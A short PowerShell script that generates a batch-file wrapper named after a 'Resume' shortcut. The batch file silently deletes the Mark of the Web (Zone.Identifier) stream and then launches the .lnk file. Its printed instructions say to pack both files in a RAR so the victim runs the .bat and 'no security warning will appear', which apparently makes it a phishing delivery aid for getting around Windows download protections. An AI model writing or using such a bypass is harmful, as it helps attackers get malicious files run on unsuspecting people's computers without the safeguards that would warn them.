# ============================================
# CREATE BATCH WRAPPER TO BYPASS MOTW WARNING
# ============================================
# This creates a .bat file that removes Zone.Identifier
# before executing the Resume.lnk file
# ============================================

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  MOTW BYPASS WRAPPER CREATOR" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$lnkName = "Resume"
$lnkFile = "$lnkName.lnk"
$batFile = "$lnkName.bat"

$batContent = @"
@echo off
setlocal
set "LNK_FILE=%~dp0$lnkFile"
set "ZONE_ID=%LNK_FILE%:Zone.Identifier"

REM Remove Mark of the Web (Zone.Identifier) silently
if exist "%ZONE_ID%" (
    del /f /q "%ZONE_ID%" >nul 2>&1
)

REM Execute the .lnk file
start "" "%LNK_FILE%"
endlocal
"@

$batPath = Join-Path $PSScriptRoot $batFile

try {
    [System.IO.File]::WriteAllText($batPath, $batContent, [System.Text.Encoding]::ASCII)
    Write-Host "Created: $batFile" -ForegroundColor Green
    Write-Host ""
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  1. Include BOTH files in your RAR:" -ForegroundColor White
    Write-Host "     - $lnkFile" -ForegroundColor Gray
    Write-Host "     - $batFile" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  2. User runs $batFile instead of $lnkFile" -ForegroundColor White
    Write-Host "  3. No security warning will appear!" -ForegroundColor Green
    Write-Host ""
} catch {
    Write-Host "ERROR: $_" -ForegroundColor Red
    exit 1
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

